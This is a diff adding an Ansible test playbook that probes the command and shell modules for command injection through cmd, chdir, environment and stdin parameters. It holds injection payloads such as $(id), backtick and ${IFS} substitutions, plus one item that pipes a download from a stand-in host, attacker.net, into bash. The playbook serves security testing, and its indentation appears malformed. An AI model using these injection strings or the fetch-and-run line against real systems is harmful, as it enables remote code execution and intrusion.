@@ -1,0 +1,31 @@
+
+---
+- name: Test playbook for command/shell modules
+  hosts: all
+    tasks:
+      - name: Test for command injection via 'cmd' parameter
+        command: "{{ item }}"
+        with_items:
+          - "echo {{'$(id)'}}"
+          - "echo {{'`id`'}}"
+          - "echo {{'${IFS}/tmp/a;id${IFS}>&2;curl${IFS}http://attacker.net|bash${IFS}||id${IFS}'}}"
+
+      - name: Test for command injection via 'creates', 'executable', and 'chdir' parameters
+        shell: ls "{{ item }}"
+        args:
+          creates: "/tmp/cmd-inj"
+          executable: "/bin/bash"
+          chdir: "/tmp/cmd-inj ; id > /tmp/cmd-inj/cmd.log"
+        with_items:
+          - "/some/path/"
+          - "${IFS}/tmp/a && id > /tmp/a/cmd.log"
+
+      - name: Test for command injection via 'environment' parameter
+        shell: echo $USER
+        environment:
+          MALICIOUS: "{{'$(id)'}}"
+      
+      - name: Test for command injection via 'stdin' parameter
+        shell: cat
+        args:
+          stdin: "{{'$(id)'}}"
